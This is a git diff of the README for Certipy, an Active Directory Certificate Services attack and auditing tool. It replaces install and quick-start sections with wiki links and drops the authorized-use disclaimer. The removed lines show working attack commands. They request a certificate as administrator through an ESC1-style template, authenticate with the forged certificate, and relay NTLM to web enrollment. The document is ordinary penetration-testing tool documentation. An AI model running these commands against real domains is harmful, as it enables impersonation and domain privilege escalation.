@@ -13,12 +13,13 @@
 
 ## 🔍 Features
 
-- 🔎 Discover Enterprise Certificate Authorities and Templates
-- 🚩 Identify misconfigurations (e.g., ESC1–ESC16)
-- 🔐 Request and forge certificates
-- 🎭 Perform authentication using certificates (PKINIT/Schannel)
-- 📡 Relay NTLM authentication to AD CS HTTP/RPC endpoints
-- 🧪 Support for Shadow Credentials, Golden Certificates, and Certificate Mapping Attacks
+* 🔎 Discover Certificate Authorities and Templates
+* 🚩 Identify misconfigurations
+* 🔐 Request and forge certificates
+* 🎭 Perform authentication using certificates
+* 📡 Relay NTLM authentication to AD CS HTTP(S)/RPC endpoints
+* 🗝️ Support for Shadow Credentials, Golden Certificates, and Certificate Mapping Attacks
+* 🧰 And much more!
 
 ---
 
@@ -30,93 +31,27 @@ Read the full **step-by-step usage guide**, including installation, vulnerabilit
 
 ## ⚙️ Installation
 
-Certipy supports **Python 3.12+** on both **Linux** and **Windows**. Linux is the primary supported platform, but core functionality works on Windows as well.
-
-> [!TIP]
-> **For Kali Linux Users**  
-> Certipy is pre-installed in Kali under the command name `certipy-ad`.  
-> The Kali package is **not maintained by the original author** and may **lag behind the latest version**.  
-> For the latest features and fixes, install from PyPI manually using `pip`.
-
-### 🐧 Linux (Debian/Ubuntu/Kali)
-
-```bash
-sudo apt update && sudo apt install -y python3 python3-venv python3-pip
-python3 -m venv ~/certipy-env
-source ~/certipy-env/bin/activate
-pip install --upgrade pip
-pip install certipy-ad
-````
-
-### 🪟 Windows (PowerShell)
-
-```powershell
-python -m venv certipy-env
-certipy-env\Scripts\Activate.ps1
-pip install --upgrade pip
-pip install certipy-ad
-```
-
-Verify installation:
-
-```bash
-certipy -h
-```
+See the [Installation Guide](https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installing-Certipy) for instructions on how to install Certipy.
 
 ---
 
 ## 🚀 Quick Start
 
-### Enumerate CAs and Templates
-
-```bash
-certipy find -u 'user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100
-```
-
-### Request a Certificate for Another User (ESC1-style)
-
-```bash
-certipy req -u 'user@domain.local' -p 'Passw0rd!' \
-  -ca 'CORP-CA' -target 'CA.CORP.LOCAL' \
-  -template 'ESC1' \
-  -upn 'administrator@corp.local' \
-  -sid 'S-1-5-21-2328196741-663698128-2762965104-500' \
-  -dc-ip 10.0.0.100
-```
-
-### Authenticate with a Certificate
-
-```bash
-certipy auth -pfx ./administrator.pfx -dc-ip 10.0.0.100
-```
-
-### NTLM Relay to AD CS Web Enrollment (ESC8)
-
-```bash
-certipy relay -ca http://ca.corp.local -template DomainController
-```
+See the [Quick Start Guide](https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Using-Certipy) for a quick overview of the most common commands and usage examples.
 
 ---
 
-## ✅ Supported ESC Vulnerabilities
+## 🎯 Supported AD CS Vulnerabilities
 
-Certipy provides comprehensive support for detecting and exploiting AD CS vulnerabilities **ESC1 – ESC16**
+Certipy supports detection and exploitation of AD CS vulnerabilities across the full range of ESC1–ESC16.
 
-For detailed explanations, exploitation steps, and mitigation strategies, refer to the [Certipy Wiki](https://github.com/ly4k/Certipy/wiki).
-
----
-
-## 📎 Related Tools & References
-
-* 📘 [Certified Pre-Owned – SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
-* 🔭 [BloodHound PKI Attack Paths](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf)
-* 🛡️ [Microsoft AD CS Hardening Guide](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-prevent-users-request-certificate)
+For detailed explanations and exploitation steps, refer to the [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation-Techniques).
 
 ---
 
-## 🛡️ Disclaimer
+## 📎 Resources
 
-This tool is designed exclusively for use in **authorized penetration testing**, **red teaming**, **security assessments**, and **security research**. **Do not use** in environments where you do not have **explicit written permission**. Unauthorized use may violate laws and ethical standards.
+See the [Resources](https://github.com/ly4k/Certipy-private/wiki/03-%E2%80%90-Resources) for selection of key resources related to AD CS security.
 
 ---
 
